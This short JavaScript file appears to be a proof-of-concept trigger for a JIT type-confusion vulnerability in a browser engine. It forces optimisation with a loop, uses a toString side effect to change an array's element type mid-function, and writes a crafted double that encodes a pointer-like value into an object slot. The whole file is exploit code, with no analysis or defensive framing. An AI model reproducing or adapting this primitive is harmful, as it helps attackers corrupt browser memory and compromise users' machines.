var ary_1 = [1.1, 2.2, 3.3];
ary_1['a'] = 1;

var go = function (a, c) {
    a[0] = 1.1;
    a[1] = 2.2;
    c == 1;
    a[2] = 5.67070584648226e-310;
}

for (var i = 0; i < 0x100000; i++) {
    go(ary_1, {});
}

go(ary_1, { toString: () => { ary_1[0] = {}; return '1'; } });

"" + ary_1[2];